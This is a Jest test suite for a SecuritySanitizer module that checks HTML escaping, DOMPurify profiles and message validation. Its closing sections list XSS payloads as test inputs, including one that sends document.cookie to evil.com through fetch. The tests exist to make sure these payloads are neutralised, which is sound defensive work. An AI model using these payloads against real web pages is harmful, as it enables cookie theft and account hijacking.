'use strict';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

jest.mock('../../../src/renderer/shared/utils/logger', () => ({
  createRendererLogger: jest.fn(() => ({
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
    trace: jest.fn(),
    child: jest.fn(function () { return this; }),
  })),
}));

// DOMPurify is not available in jsdom test env
jest.mock('dompurify', () => null, { virtual: true });

const SecuritySanitizer = require('../../../src/renderer/shared/security/SecuritySanitizer');

// ---------------------------------------------------------------------------
// Suite
// ---------------------------------------------------------------------------

describe('SecuritySanitizer', () => {
  let sanitizer;

  beforeEach(() => {
    jest.clearAllMocks();
    delete window.DOMPurify;
    delete window.sanitizer;

    const { createRendererLogger } = require('../../../src/renderer/shared/utils/logger');
    createRendererLogger.mockReturnValue({
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      debug: jest.fn(),
      trace: jest.fn(),
      child: jest.fn(function () { return this; }),
    });

    sanitizer = null;
  });

  afterEach(() => {
    if (sanitizer) {
      try { sanitizer.dispose(); } catch (_) { /* already disposed */ }
    }
    delete window.DOMPurify;
    delete window.sanitizer;
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Constructor
  // ═══════════════════════════════════════════════════════════════════════

  describe('constructor', () => {
    it('creates instance', () => {
      sanitizer = new SecuritySanitizer();
      expect(sanitizer).toBeInstanceOf(SecuritySanitizer);
    });

    it('initializes in either fallback or DOMPurify mode', () => {
      sanitizer = new SecuritySanitizer();
      expect(typeof sanitizer.fallbackMode).toBe('boolean');
      if (sanitizer.fallbackMode) {
        expect(sanitizer.DOMPurify).toBeNull();
      } else {
        expect(sanitizer.isDOMPurifyAvailable()).toBe(true);
      }
    });

    it('defines strict profile', () => {
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.profiles.strict).toBeDefined();
      expect(sanitizer.profiles.strict.ALLOWED_TAGS).toContain('p');
      expect(sanitizer.profiles.strict.ALLOWED_TAGS).toContain('code');
    });

    it('defines markdown profile', () => {
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.profiles.markdown).toBeDefined();
      expect(sanitizer.profiles.markdown.FORBID_TAGS).toContain('script');
      expect(sanitizer.profiles.markdown.FORBID_TAGS).toContain('iframe');
    });

    it('defines permissive profile', () => {
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.profiles.permissive).toBeDefined();
      expect(sanitizer.profiles.permissive.ALLOWED_TAGS).toContain('img');
    });

    it('markdown profile forbids dangerous attributes', () => {
      sanitizer = new SecuritySanitizer();
      const { FORBID_ATTR } = sanitizer.profiles.markdown;
      expect(FORBID_ATTR).toContain('onerror');
      expect(FORBID_ATTR).toContain('onload');
      expect(FORBID_ATTR).toContain('onclick');
    });

    it('permissive profile forbids dangerous attributes', () => {
      sanitizer = new SecuritySanitizer();
      const { FORBID_ATTR } = sanitizer.profiles.permissive;
      expect(FORBID_ATTR).toContain('onerror');
      expect(FORBID_ATTR).toContain('onload');
      expect(FORBID_ATTR).toContain('onclick');
      expect(FORBID_ATTR).toContain('onmouseover');
    });

    it('permissive profile forbids form tag', () => {
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.profiles.permissive.FORBID_TAGS).toContain('form');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Constructor with window.DOMPurify
  // ═══════════════════════════════════════════════════════════════════════

  describe('constructor (with DOMPurify)', () => {
    it('uses window.sanitizer wrapper when available', () => {
      const mockSanitizer = {
        sanitizeHTML: jest.fn((html) => html),
        isAvailable: jest.fn(() => true),
      };
      window.sanitizer = mockSanitizer;
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.externalSanitizer).toBe(mockSanitizer);
      expect(sanitizer.fallbackMode).toBe(false);
    });

    it('uses window.DOMPurify when available', () => {
      const mockDOMPurify = { sanitize: jest.fn() };
      window.DOMPurify = mockDOMPurify;
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.DOMPurify).toBe(mockDOMPurify);
      expect(sanitizer.fallbackMode).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // escapeHTML
  // ═══════════════════════════════════════════════════════════════════════

  describe('escapeHTML', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    it('returns empty string for null', () => {
      expect(sanitizer.escapeHTML(null)).toBe('');
    });

    it('returns empty string for undefined', () => {
      expect(sanitizer.escapeHTML(undefined)).toBe('');
    });

    it('returns empty string for empty string', () => {
      expect(sanitizer.escapeHTML('')).toBe('');
    });

    it('returns empty string for non-string', () => {
      expect(sanitizer.escapeHTML(42)).toBe('');
    });

    it('escapes & to &amp;', () => {
      expect(sanitizer.escapeHTML('a & b')).toBe('a &amp; b');
    });

    it('escapes < to &lt;', () => {
      expect(sanitizer.escapeHTML('a < b')).toBe('a &lt; b');
    });

    it('escapes > to &gt;', () => {
      expect(sanitizer.escapeHTML('a > b')).toBe('a &gt; b');
    });

    it('escapes " to &quot;', () => {
      expect(sanitizer.escapeHTML('a "b" c')).toBe('a &quot;b&quot; c');
    });

    it("escapes ' to &#39;", () => {
      expect(sanitizer.escapeHTML("a 'b' c")).toBe('a &#39;b&#39; c');
    });

    it('escapes / to &#x2F;', () => {
      expect(sanitizer.escapeHTML('a/b')).toBe('a&#x2F;b');
    });

    it('escapes all dangerous characters together', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizer.escapeHTML(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).not.toContain('"');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
    });

    it('preserves safe text unchanged', () => {
      expect(sanitizer.escapeHTML('hello world 123')).toBe('hello world 123');
    });

    it('handles string with only special characters', () => {
      const result = sanitizer.escapeHTML('<>&"\'\/');
      expect(result).toBe('&lt;&gt;&amp;&quot;&#39;&#x2F;');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // sanitizeHTML — fallback mode
  // ═══════════════════════════════════════════════════════════════════════

  describe('sanitizeHTML (fallback mode)', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
      sanitizer.fallbackMode = true;
      sanitizer.DOMPurify = null;
      sanitizer.externalSanitizer = null;
    });

    it('returns empty string for null', () => {
      expect(sanitizer.sanitizeHTML(null)).toBe('');
    });

    it('returns empty string for undefined', () => {
      expect(sanitizer.sanitizeHTML(undefined)).toBe('');
    });

    it('returns empty string for empty string', () => {
      expect(sanitizer.sanitizeHTML('')).toBe('');
    });

    it('returns empty string for non-string', () => {
      expect(sanitizer.sanitizeHTML(42)).toBe('');
    });

    it('escapes all HTML in fallback mode', () => {
      const result = sanitizer.sanitizeHTML('<p>hello</p>');
      expect(result).not.toContain('<p>');
      expect(result).toContain('&lt;p&gt;');
    });

    it('escapes script tags in fallback mode', () => {
      const result = sanitizer.sanitizeHTML('<script>alert(1)</script>');
      expect(result).not.toContain('<script>');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // sanitizeHTML — DOMPurify mode
  // ═══════════════════════════════════════════════════════════════════════

  describe('sanitizeHTML (DOMPurify mode)', () => {
    let mockDOMPurify;

    beforeEach(() => {
      mockDOMPurify = {
        sanitize: jest.fn((html) => html),
      };
      window.DOMPurify = mockDOMPurify;
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.fallbackMode).toBe(false);
    });

    it('calls DOMPurify.sanitize with html and config', () => {
      sanitizer.sanitizeHTML('<p>test</p>');
      expect(mockDOMPurify.sanitize).toHaveBeenCalledWith(
        '<p>test</p>',
        sanitizer.profiles.markdown
      );
    });

    it('uses specified profile', () => {
      sanitizer.sanitizeHTML('<p>test</p>', { profile: 'strict' });
      expect(mockDOMPurify.sanitize).toHaveBeenCalledWith(
        '<p>test</p>',
        sanitizer.profiles.strict
      );
    });

    it('uses custom config when provided', () => {
      const customConfig = { ALLOWED_TAGS: ['b'] };
      sanitizer.sanitizeHTML('<p>test</p>', { config: customConfig });
      expect(mockDOMPurify.sanitize).toHaveBeenCalledWith(
        '<p>test</p>',
        customConfig
      );
    });

    it('defaults to markdown profile', () => {
      sanitizer.sanitizeHTML('<p>test</p>');
      expect(mockDOMPurify.sanitize).toHaveBeenCalledWith(
        '<p>test</p>',
        sanitizer.profiles.markdown
      );
    });

    it('falls back to escapeHTML if DOMPurify.sanitize throws', () => {
      mockDOMPurify.sanitize.mockImplementation(() => { throw new Error('purify error'); });
      const result = sanitizer.sanitizeHTML('<p>test</p>');
      // Should have fallen back to escapeHTML
      expect(result).toContain('&lt;');
    });

    it('falls back to markdown profile for unknown profile name', () => {
      sanitizer.sanitizeHTML('<p>test</p>', { profile: 'nonexistent' });
      expect(mockDOMPurify.sanitize).toHaveBeenCalledWith(
        '<p>test</p>',
        sanitizer.profiles.markdown
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // sanitizeMarkdown
  // ═══════════════════════════════════════════════════════════════════════

  describe('sanitizeMarkdown', () => {
    it('delegates to sanitizeHTML with markdown profile', () => {
      sanitizer = new SecuritySanitizer();
      const spy = jest.spyOn(sanitizer, 'sanitizeHTML');
      sanitizer.sanitizeMarkdown('<p>text</p>');
      expect(spy).toHaveBeenCalledWith('<p>text</p>', { profile: 'markdown' });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // sanitizeOutputHtml
  // ═══════════════════════════════════════════════════════════════════════

  describe('sanitizeOutputHtml', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    it('strips scripts in direct mode', () => {
      const html = '<p>ok</p><script>alert(1)</script>';
      const result = sanitizer.sanitizeOutputHtml(html, { mode: 'direct' });
      expect(result).toContain('<p>ok</p>');
      expect(result).not.toContain('<script>');
    });

    it('strips iframe tags in direct mode', () => {
      const html = '<iframe src="x"></iframe><p>ok</p>';
      const result = sanitizer.sanitizeOutputHtml(html, { mode: 'direct' });
      expect(result).not.toContain('<iframe');
      expect(result).toContain('<p>ok</p>');
    });

    it('keeps iframe tags in iframe mode', () => {
      const html = '<iframe src="x"></iframe><p>ok</p>';
      const result = sanitizer.sanitizeOutputHtml(html, { mode: 'iframe' });
      expect(result).toContain('<iframe');
      expect(result).toContain('<p>ok</p>');
    });

    it('keeps scripts when allowScripts is true', () => {
      const html = '<p>ok</p><script>const a = 1;</script>';
      const result = sanitizer.sanitizeOutputHtml(html, { mode: 'iframe', allowScripts: true });
      expect(result).toContain('<script>');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // sanitizeUserInput
  // ═══════════════════════════════════════════════════════════════════════

  describe('sanitizeUserInput', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    it('delegates to escapeHTML', () => {
      const spy = jest.spyOn(sanitizer, 'escapeHTML');
      sanitizer.sanitizeUserInput('test');
      expect(spy).toHaveBeenCalledWith('test');
    });

    it('escapes all HTML in user input', () => {
      const result = sanitizer.sanitizeUserInput('<script>alert(1)</script>');
      expect(result).not.toContain('<script>');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // validateMessage
  // ═══════════════════════════════════════════════════════════════════════

  describe('validateMessage', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    it('returns false for null', () => {
      expect(sanitizer.validateMessage(null)).toBe(false);
    });

    it('returns false for undefined', () => {
      expect(sanitizer.validateMessage(undefined)).toBe(false);
    });

    it('returns false for non-object', () => {
      expect(sanitizer.validateMessage('string')).toBe(false);
    });

    it('returns false for empty object', () => {
      expect(sanitizer.validateMessage({})).toBe(false);
    });

    it('returns false for missing content', () => {
      expect(sanitizer.validateMessage({ role: 'user' })).toBe(false);
    });

    it('returns false for non-string content', () => {
      expect(sanitizer.validateMessage({ content: 42 })).toBe(false);
    });

    it('returns true for valid message', () => {
      expect(sanitizer.validateMessage({ content: 'hello' })).toBe(true);
    });

    it('returns false for content exceeding max length', () => {
      const longContent = 'x'.repeat(1000001);
      expect(sanitizer.validateMessage({ content: longContent })).toBe(false);
    });

    it('returns true for content at exact max length', () => {
      const exactContent = 'x'.repeat(1000000);
      expect(sanitizer.validateMessage({ content: exactContent })).toBe(true);
    });

    // ─── XSS / Injection pattern detection ───────────────────────────

    describe('suspicious pattern detection', () => {
      it('detects <script> tags', () => {
        expect(sanitizer.validateMessage({
          content: '<script>alert(1)</script>',
        })).toBe(false);
      });

      it('detects <script> tags case-insensitive', () => {
        expect(sanitizer.validateMessage({
          content: '<SCRIPT>alert(1)</SCRIPT>',
        })).toBe(false);
      });

      it('detects javascript: protocol', () => {
        expect(sanitizer.validateMessage({
          content: '<a href="javascript:alert(1)">click</a>',
        })).toBe(false);
      });

      it('detects javascript: case-insensitive', () => {
        expect(sanitizer.validateMessage({
          content: 'JAVASCRIPT:void(0)',
        })).toBe(false);
      });

      it('detects event handler attributes (onclick)', () => {
        expect(sanitizer.validateMessage({
          content: '<div onclick="alert(1)">click</div>',
        })).toBe(false);
      });

      it('detects event handler attributes (onerror)', () => {
        expect(sanitizer.validateMessage({
          content: '<img onerror="alert(1)" src="x">',
        })).toBe(false);
      });

      it('detects event handler attributes (onload)', () => {
        expect(sanitizer.validateMessage({
          content: '<body onload="alert(1)">',
        })).toBe(false);
      });

      it('detects event handler attributes (onmouseover)', () => {
        expect(sanitizer.validateMessage({
          content: '<div onmouseover ="alert(1)">hover</div>',
        })).toBe(false);
      });

      it('detects <iframe> tags', () => {
        expect(sanitizer.validateMessage({
          content: '<iframe src="https://evil.com"></iframe>',
        })).toBe(false);
      });

      it('detects <object> tags', () => {
        expect(sanitizer.validateMessage({
          content: '<object data="flash.swf"></object>',
        })).toBe(false);
      });

      it('detects <embed> tags', () => {
        expect(sanitizer.validateMessage({
          content: '<embed src="flash.swf">',
        })).toBe(false);
      });

      it('allows safe text with < and > that are not suspicious', () => {
        expect(sanitizer.validateMessage({
          content: 'if a > b and c < d then ok',
        })).toBe(true);
      });

      it('allows markdown code blocks with script-like content', () => {
        // The regex checks literal <script> tags, not text inside code blocks
        // This tests that safe-looking code references pass
        expect(sanitizer.validateMessage({
          content: 'Use `document.querySelector` to select elements',
        })).toBe(true);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // getProfile
  // ═══════════════════════════════════════════════════════════════════════

  describe('getProfile', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    it('returns strict profile', () => {
      expect(sanitizer.getProfile('strict')).toBe(sanitizer.profiles.strict);
    });

    it('returns markdown profile', () => {
      expect(sanitizer.getProfile('markdown')).toBe(sanitizer.profiles.markdown);
    });

    it('returns permissive profile', () => {
      expect(sanitizer.getProfile('permissive')).toBe(sanitizer.profiles.permissive);
    });

    it('returns markdown profile for unknown name', () => {
      expect(sanitizer.getProfile('nonexistent')).toBe(sanitizer.profiles.markdown);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // isDOMPurifyAvailable
  // ═══════════════════════════════════════════════════════════════════════

  describe('isDOMPurifyAvailable', () => {
    it('returns false when DOMPurify is not loaded', () => {
      sanitizer = new SecuritySanitizer();
      sanitizer.fallbackMode = true;
      sanitizer.DOMPurify = null;
      sanitizer.externalSanitizer = null;
      expect(sanitizer.isDOMPurifyAvailable()).toBe(false);
    });

    it('returns true when DOMPurify is loaded', () => {
      window.DOMPurify = { sanitize: jest.fn() };
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.isDOMPurifyAvailable()).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // dispose
  // ═══════════════════════════════════════════════════════════════════════

  describe('dispose', () => {
    it('nulls DOMPurify reference', () => {
      window.DOMPurify = { sanitize: jest.fn() };
      sanitizer = new SecuritySanitizer();
      expect(sanitizer.DOMPurify).not.toBeNull();
      sanitizer.dispose();
      expect(sanitizer.DOMPurify).toBeNull();
    });

    it('is safe to call on already-disposed instance', () => {
      sanitizer = new SecuritySanitizer();
      sanitizer.dispose();
      expect(() => sanitizer.dispose()).not.toThrow();
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Adversarial XSS payloads (security-critical surface)
  // ═══════════════════════════════════════════════════════════════════════

  describe('adversarial XSS payloads via escapeHTML', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    const xssPayloads = [
      { name: 'basic script injection', input: '<script>alert("xss")</script>' },
      { name: 'img onerror', input: '<img src=x onerror=alert(1)>' },
      { name: 'svg onload', input: '<svg onload=alert(1)>' },
      { name: 'body onload', input: '<body onload=alert(1)>' },
      { name: 'event handler in div', input: '<div onclick=alert(1)>click</div>' },
      { name: 'javascript URI', input: '<a href="javascript:alert(1)">link</a>' },
      { name: 'data URI with script', input: '<a href="data:text/html,<script>alert(1)</script>">link</a>' },
      { name: 'iframe injection', input: '<iframe src="javascript:alert(1)"></iframe>' },
      { name: 'object tag', input: '<object data="javascript:alert(1)"></object>' },
      { name: 'embed tag', input: '<embed src="javascript:alert(1)">' },
      { name: 'form action', input: '<form action="javascript:alert(1)"><input type=submit></form>' },
      { name: 'style expression', input: '<div style="background:url(javascript:alert(1))">x</div>' },
      { name: 'double encoding', input: '&lt;script&gt;alert(1)&lt;/script&gt;' },
      { name: 'null byte injection', input: '<scr\0ipt>alert(1)</script>' },
      { name: 'backtick in attribute', input: '<img src=`x` onerror=alert(1)>' },
    ];

    for (const { name, input } of xssPayloads) {
      it(`neutralizes: ${name}`, () => {
        const result = sanitizer.escapeHTML(input);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('<img');
        expect(result).not.toContain('<svg');
        expect(result).not.toContain('<iframe');
        expect(result).not.toContain('<object');
        expect(result).not.toContain('<embed');
        expect(result).not.toContain('<form');
        expect(result).not.toContain('<body');
        expect(result).not.toContain('<div');
        expect(result).not.toContain('<a ');
      });
    }
  });

  describe('adversarial validation payloads', () => {
    beforeEach(() => {
      sanitizer = new SecuritySanitizer();
    });

    const attackVectors = [
      '<script>document.cookie</script>',
      'javascript:void(document.cookie)',
      '<img src=x onerror=fetch("evil.com?c="+document.cookie)>',
      '<iframe src="data:text/html,<script>parent.postMessage(document.cookie,\'*\')</script>">',
      '<object type="text/html" data="data:text/html,<script>alert(1)</script>">',
      '<embed type="text/html" src="data:text/html,<script>alert(1)</script>">',
    ];

    for (const attack of attackVectors) {
      it(`rejects attack: ${attack.substring(0, 50)}...`, () => {
        expect(sanitizer.validateMessage({ content: attack })).toBe(false);
      });
    }
  });
});
